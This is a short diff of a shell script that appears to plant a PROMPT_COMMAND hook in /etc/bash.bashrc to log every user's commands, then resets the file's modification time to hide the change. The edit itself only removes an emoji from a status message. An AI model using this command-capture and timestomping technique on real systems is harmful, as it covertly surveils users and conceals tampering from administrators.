@@ -19,4 +19,4 @@ echo "lets export PROMPT_COMMAND='RETRN_VAL=\$?;echo \"\$(whoami) [\$\$]: \$(his
 echo "[!] - restoring mtime of /etc/bash.bashrc to ${mtime}"
 touch -d "${mtime}" /etc/bash.bashrc
 
-echo "[!] - Everything is over here, check your ${output} ツ"
+echo "[!] - Everything is over here, check your ${output} "
